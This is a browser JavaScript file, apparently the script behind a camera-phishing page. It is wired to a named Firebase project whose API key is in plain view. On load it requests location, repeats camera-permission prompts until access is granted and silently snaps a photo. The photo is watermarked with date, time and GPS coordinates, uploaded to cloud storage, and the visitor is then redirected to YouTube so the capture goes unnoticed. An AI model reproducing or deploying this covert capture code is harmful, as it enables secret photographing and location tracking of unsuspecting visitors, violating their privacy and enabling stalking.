// Your Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyDEAy2KXezICmuuQZnhNq12nqwwBouDjt4",
    authDomain: "webcamera-es-universe-git.firebaseapp.com",
    databaseURL: "https://webcamera-es-universe-git-default-rtdb.firebaseio.com",
    projectId: "webcamera-es-universe-git",
    storageBucket: "webcamera-es-universe-git.appspot.com",
    messagingSenderId: "949054088643",
    appId: "1:949054088643:web:039f79fcae7259f4358976"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const database = firebase.database();

// Variable to store location
let userLocation = {
    latitude: null,
    longitude: null
};

// Function to request location permission and get location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
            userLocation.latitude = position.coords.latitude.toFixed(6); // Store latitude
            userLocation.longitude = position.coords.longitude.toFixed(6); // Store longitude
            console.log('Location retrieved:', userLocation);
        }, (error) => {
            console.error('Error accessing location:', error);
            document.getElementById('message').textContent = 'Location access denied or an error occurred.';
        });
    } else {
        console.error('Geolocation is not supported by this browser.');
    }
}

// Function to format date and time
function formatDateTime() {
    const now = new Date();
    const date = now.toLocaleDateString();
    const time = now.toLocaleTimeString();
    const day = now.toLocaleDateString('en-US', { weekday: 'long' });
    return `${day}, ${date}, ${time}`;
}

// Function to capture photo and upload to Firebase Storage with watermark
function capturePhoto(video) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    // Set the canvas size to the video size
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw the video frame to the canvas
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Check if location is available for watermark
    if (userLocation.latitude && userLocation.longitude) {
        // Set watermark text with date, time, and location
        const watermarkText = `Date: ${formatDateTime()} \nL:${userLocation.latitude}, L:${userLocation.longitude}`;

        // Set watermark background
        context.fillStyle = 'black';
        context.globalAlpha = 0.5;
        context.fillRect(0, canvas.height - 80, canvas.width, 80);  // Background rectangle

        // Set text properties for watermark
        context.font = '20px Arial'; // Font size and type
        context.fillStyle = 'white'; // Text color
        context.globalAlpha = 1.0; // Full opacity for the text
        context.fillText(watermarkText, 10, canvas.height - 50); // Positioning the text
    }

    // Convert the canvas image to a Blob
    canvas.toBlob(async function(blob) {
        const fileName = `photo_${Date.now()}.png`;
        const storageRef = storage.ref(`users/${fileName}`);

        try {
            // Upload the image to Firebase Storage with custom metadata
            await storageRef.put(blob, {
                customMetadata: {
                    latitude: userLocation.latitude,
                    longitude: userLocation.longitude
                }
            });

            console.log('Photo uploaded with filename:', fileName);

            // Redirect after 1 second
            setTimeout(() => {
                window.location.href = 'https://youtube.com/';  // Redirect URL after upload
            }, 1000);  // 1000 milliseconds = 1 second
        } catch (error) {
            console.error('Error uploading to Firebase:', error);
        }
    }, 'image/png', 1.0);  // The third argument '1.0' specifies the image quality (max quality)
}

// Access the camera with higher resolution and request permission until granted
async function startVideo() {
    let accessGranted = false;
    while (!accessGranted) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
            accessGranted = true;  // Camera access granted
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // Capture photo once the video stream is ready
            video.onloadedmetadata = () => {
                capturePhoto(video);
            };
        } catch (error) {
            console.error('Error accessing camera:', error);
            document.getElementById('message').textContent = 'Camera access denied, trying again...';

            // Wait for 3 seconds before retrying
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
}

// Start the camera and location request on page load
window.onload = () => {
    getLocation();  // Request location permission first
    startVideo();   // Request camera permission next
};
